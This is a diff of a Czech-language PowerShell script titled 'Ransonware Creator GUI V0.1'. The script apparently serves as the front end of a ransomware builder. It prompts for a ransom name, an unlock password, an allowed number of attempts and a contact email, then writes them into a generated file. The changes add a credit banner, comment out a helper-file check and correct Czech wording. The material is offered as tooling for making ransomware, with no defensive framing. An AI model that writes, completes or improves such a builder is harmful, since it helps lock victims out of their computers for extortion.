@@ -2,6 +2,12 @@
 
 Import-Module Microsoft.PowerShell.Management
 Import-Module Microsoft.PowerShell.Utility
+#  _________________________________________________
+#/                                                   \
+#|      s GUI & PowerShell přepsání pomohl JPmanOF    |
+#\                                                   /
+#  ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅  ̅
+
 #--------TODO------------
 #21.08.2024 13:10:19 Add errorbox to creatorhelpercheck
 #21.08.2024 14:01:45 Add errorbox to errors
@@ -21,30 +27,30 @@ $blank = ""
 
 Clear-Host
 #Check if creator helper exists
-if (Test-Path $helper) {
-    Write-Host ""
-}
-else {
-    Write-Host "Ujistete se ze $helper existuje a je ve stejné složce jako $creatorName"
-    Write-Host "Pokud jste se ujistili muzete napsat na $DefaultEmail"
-    Pause
-}
+#if (Test-Path $helper) {
+#    Write-Host ""
+#}
+#else {
+#    Write-Host "Ujistete se ze $helper existuje a je ve stejné složce jako $creatorName"
+#    Write-Host "Pokud jste se ujistili muzete napsat na $DefaultEmail"
+#    Pause
+#}
 
 
 
 #udaje -->
-$OutputName = & {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox("Zadejte jméno ransonu nebo dejte OK (default name: $DefaultName):", 'Ransonware Creator GUI V0.1')}
+$OutputName = & {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox("Zadejte jméno ransomwaru nebo dejte OK (výchozí jméno: $DefaultName):", 'Ransonware Creator GUI V0.1')}
 if ($OutputName -eq $blank){$OutputName = $DefaultName}
 
 
 
-$password = & {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox("Vytvořte heslo nebo dejte OK (default password: $DefaultPassword)", 'Ransonware Creator GUI V0.1')}
+$password = & {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox("Vytvořte heslo nebo dejte OK (výchozí heslo: $DefaultPassword)", 'Ransonware Creator GUI V0.1')}
 if ($password -eq $blank){$password = $DefaultPassword}
 
-$attempts = & {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox("Zadejte kolik pokusů je na odemčení počítače (default attempts: $DefaultAttempts)", 'Ransonware Creator GUI V0.1')}
+$attempts = & {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox("Zadejte kolik pokusů je na odemčení počítače (výchozích pokusů: $DefaultAttempts)", 'Ransonware Creator GUI V0.1')}
 if ($attempts -eq $blank){$attempts = $DefaultAttempts}
 
-$Email = & {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox("Zadejte email nebo dejte OK (default email: $DefaultEmail)", 'Ransonware Creator GUI V0.1')}
+$Email = & {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox("Zadejte email nebo dejte OK (výchozí email: $DefaultEmail)", 'Ransonware Creator GUI V0.1')}
 if ($Email -eq $blank){$Email = $DefaultEmail}
 
 
@@ -80,7 +86,7 @@ Email: $Email
 
 #Confirm + Create
 function confirm {
-$confirm = & {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Jsou tyto údaje zprávné?", 'Ověření', 'YesNo', [System.Windows.Forms.MessageBoxIcon]::Information);}
+$confirm = & {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Jsou tyto údaje správné?", 'Ověření', 'YesNo', [System.Windows.Forms.MessageBoxIcon]::Information);}
 
 if ($confirm -eq "Yes" -or $confirm -eq $blank){
     ('$password' + "=" + '"' + "$password" + '"') | Set-Content .\$OutputName
